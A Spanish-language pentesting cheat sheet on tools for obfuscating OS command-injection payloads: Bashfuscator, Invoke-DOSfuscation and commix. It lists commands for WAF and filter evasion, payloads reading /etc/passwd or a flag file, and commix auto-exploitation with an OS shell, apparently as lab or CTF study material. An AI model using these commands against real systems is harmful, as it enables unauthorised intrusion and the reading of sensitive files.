---
aliases:
tags:
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[OS Command Injection]]"
---
# Command Injection - Herramientas de Ofuscación Automática

---

## Bashfuscator (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/Bashfuscator/Bashfuscator && cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user` | Instalación completa | Setup inicial. `setuptools==65` específico — versiones nuevas rompen. |
| `./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd'` | Payload random ofuscado | Test rápido. **Cuidado**: output puede ser +1MB. |
| `./bashfuscator/bin/bashfuscator -c 'cmd' -s 1 -t 1 --no-mangling --layers 1` | Payload corto y simple (recomendado) | Inyecciones con límite de caracteres. |
| `./bashfuscator/bin/bashfuscator -c 'cmd' --layers 3` | 3 capas de ofuscación anidadas | Filtro/WAF agresivo. |
| `./bashfuscator/bin/bashfuscator -c 'cmd' --choose-mutators COMMAND/Reverse` | Aplica mutación específica | Cuando sabés qué evade el filtro. |
| `./bashfuscator/bin/bashfuscator --list-mutators` | Lista todas las mutaciones disponibles | Reconocimiento de opciones. |
| `bash -c 'PAYLOAD_GENERADO'` | Verificación local del payload | Antes de inyectar — confirma que ejecuta. |
^ci-herramienta-linux

---

## DOSfuscation (Windows)

Tool interactiva — PowerShell module. Funciona en Linux con `pwsh`.

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git` | Repo local | Setup. |
| `Import-Module .\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation` | Lanza shell interactiva | Sesión de ofuscación. |
| `SET COMMAND type C:\flag.txt` | Define cmd target | Dentro de la shell interactiva. |
| `encoding` | Entra al menú de codificación | Elegir técnica. |
| `1` (dentro del menú) | Aplica variante 1 (substring de env vars) | Default — produce algo como `typ%TEMP:~-3,-2%`. |
| `2`/`3` | Variantes alternativas (FORFILES, etc.) | Si la 1 no pasa filtro. |
| `sudo apt install powershell && pwsh` | Ejecutar DOSfuscation en Kali | Sin VM Windows a mano. |
^ci-herramienta-windows

---

## Otras tools rápidas

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `commix -u 'https://target/?host=*' --batch` | Auto-explota CI con `*` como inject point | Detection + exploitation en uno. |
| `commix -u 'https://target/?host=*' --os-shell` | Shell interactiva via CI confirmado | Post-explotación. |
| `python -c "import urllib.parse; print(urllib.parse.quote('PAYLOAD'))"` | URL-encode rápido | Manual injection prep. |
| `echo -n 'PAYLOAD' \| xxd -p \| sed 's/../\\\\x&/g'` | Hex escape de payload | Filter bypass con `\xHH`. |
| `xxd -r -p <<< '7768 6f61 6d69'` | Decode hex (whoami) | Local verification. |
^ci-herramienta-otras

### Comparación rápida

| Tool | Plataforma | Output | Best for |
|---|---|---|---|
| **Bashfuscator** | Linux | Payload bash ofuscado | Filtros con keyword blacklists. |
| **DOSfuscation** | Windows CMD | Payload con env vars | CMD filters strictos. |
| **commix** | Auto | Exploit completo | Discovery + exploitation directa. |

---
